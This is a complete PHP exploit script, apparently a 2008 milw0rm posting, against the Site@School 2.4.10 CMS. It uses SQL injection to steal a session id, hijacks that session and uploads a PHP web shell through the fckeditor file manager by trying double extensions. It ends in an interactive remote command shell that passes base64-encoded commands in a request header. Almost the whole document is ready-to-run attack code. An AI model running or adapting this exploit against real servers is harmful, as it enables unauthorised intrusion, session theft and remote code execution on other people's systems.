<?php

/*
	-------------------------------------------------------------------------
	Site@School <= 2.4.10 (fckeditor) Session Hijacking / File Upload Exploit
	-------------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://siteatschool.sourceforge.net/
	details..: works with magic_quotes_gpc = off (the bug isn't still patched: http://www.securityfocus.com/bid/27120)
	details..: works only with a specific server configuration (e.g. an Apache server with the mod_mime module installed)
	
	[-] vulnerable code in /starnet/editors/fckeditor/editor/filemanager/sas/browser.php
	
	63.	$query = "SELECT config_value FROM $table_configuration WHERE config_key='sessioncode'";
	64.	if ($result = mysql_query($query))
	65.	{
	66.		$check_sessioncode = mysql_result($result, 0);
	67.		unset ($query);
	68.		unset ($result);
	69.	}
	70.	if ($_SESSION['sessioncode'] != $check_sessioncode)
	71.	{
	72.		//if we don't have a session present the login screen
	73.		Header("Location: ../../../../../index.php");
	74.		exit;
	75.	}
	
	[...]
	
	117.	if ($option == "upload")
	118.	{
	119.		if (IsSet ($_FILES["new_file"]["name"]))
	120.		{
	121.			$file_name = $_FILES["new_file"]["name"];
	122.		}
	123.		if (IsSet ($_SESSION['opendir']))
	124.		{
	125.			$write_path = $_SESSION['user_media_path'] . "/" . $_SESSION['opendir'];
	126.			// moveupload the file to $write_path, function is in core/common.inc.php
	127.			$temp_file = $_FILES["new_file"]["tmp_name"]; //this is temporary uploaded file.	
	128.			sas_move_uploaded_file($write_path, $file_name, $temp_file);
	129.		}
	130.		$opendir = $_SESSION['opendir']; //for returning to the directory were we came from	
	131.	}
	
	an attacker could be able to retrieve a valid session id using the SQL injection bug in /starnet/addons/slideshow_full.php
	(http://www.milw0rm.com/exploits/4832) and bypass checks at lines 70-75 to upload malicious files containing php code!
*/

error_reporting(0);
ini_set("default_socket_timeout",5);
set_time_limit(0);

define(STDIN, fopen("php://stdin", "r"));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...\n";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function upload()
{
	global $host, $path, $sid;
	
	$file_ext = array(".fla", ".swf", ".rar", ".zip", ".xls", ".csv");
	
	$packet  = "GET {$path}starnet/editors/fckeditor/editor/filemanager/sas/images.php?opendir=gallery HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Cookie: PHPSESSID={$sid}\r\n";
	$packet .= "Connection: close\r\n\r\n";
	
	http_send($host, $packet);
	
	foreach ($file_ext as $ext)
	{
		print "\n[-] Trying to upload with {$ext} extension...";
		
		$payload  = "--o0oOo0o\r\n";
		$payload .= "Content-Disposition: form-data; name=\"new_file\"; filename=\"test.php{$ext}\"\r\n\r\n";
		$payload .= "<?php \${error_reporting(0)}.\${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))} ?>\r\n";
		$payload .= "--o0oOo0o--\r\n";

		$packet  = "POST {$path}starnet/editors/fckeditor/editor/filemanager/sas/browser.php?option=upload HTTP/1.0\r\n";
		$packet .= "Host: {$host}\r\n";
		$packet .= "Cookie: PHPSESSID={$sid}\r\n";
		$packet .= "Content-Length: ".strlen($payload)."\r\n";
		$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
		$packet .= "Connection: close\r\n\r\n";
		$packet .= $payload;

		if (preg_match("/File upload error/i", http_send($host, $packet))) die("\n[-] Upload failed!\n");
		
		$packet  = "GET {$path}starnet/media/gallery/test.php{$ext} HTTP/1.0\r\n";
		$packet .= "Host: {$host}\r\n";
		$packet .= "Connection: close\r\n\r\n";
		$html    = http_send($host, $packet);
		
		if (!eregi("print", $html) and eregi("_code_", $html)) return $ext;
		
		sleep(1);
	}
	
	return false;
}

function get_sid()
{
	global $host, $path, $prefix;
	
	// thanks to rgod for giving to understand that this isn't blind injetion...r.i.p. my friend!
	$sql =  "'/**/UNION/**/SELECT/**/CONCAT(CHAR(0xFF),ses_id,CHAR(0xFF),CHAR(0x27)),1,1/**/" .
		"FROM/**/{$prefix}_sessions/**/WHERE/**/ses_value/**/LIKE/**/'%sessioncode%'%23";

	$packet  = "GET {$path}starnet/addons/slideshow_full.php?album_name={$sql} HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Connection: close\r\n\r\n";

	$pieces = explode(chr(0xFF), http_send($host, $packet));
	return $pieces[1];
}

function check_target()
{
	global $host, $path, $prefix;
	
	print "\n[-] Checking {$host}...";
	
	$packet  = "GET {$path}starnet/addons/slideshow_full.php?album_name=%27 HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Connection: close\r\n\r\n";
	
	if (preg_match("/FROM (.*)_m/", http_send($host, $packet), $match)) print "vulnerable!\n";
	else die("not vulnerable!\n\n[-] Exploit failed...probably magic_quotes_gpc = on\n");
	
	$prefix = $match[1];
}

print "\n+-----------------------------------------------------------------------+";
print "\n| Site@School <= 2.4.10 Session Hijacking / File Upload Exploit by EgiX |";
print "\n+-----------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage...: php $argv[0] host path \n";
	print "\nhost....: target server (ip/hostname)";
	print "\npath....: path to sas directory\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

check_target();
$sid = get_sid();

if (empty($sid)) die("\n[-] Session id not found! Try later...\n");
else print "\n[-] Hijacking with sid {$sid}\n";

if (!($ext = upload())) die("\n[-] Exploit failed...\n");
else print "\n[-] Shell uploaded...starting it!\n";

while(1)
{
	print "\nsas-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet = "GET {$path}starnet/media/gallery/test.php{$ext} HTTP/1.0\r\n";
		$packet.= "Host: {$host}\r\n";
		$packet.= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet.= "Connection: close\r\n\r\n";
		$output = http_send($host, $packet);
		if (!preg_match("/_code_/", $output)) die("\n[-] Exploit failed...\n");
		$shell  = explode("_code_", $output);
		print "\n{$shell[1]}";
	}
	else break;
}

?>

# milw0rm.com [2008-07-04]
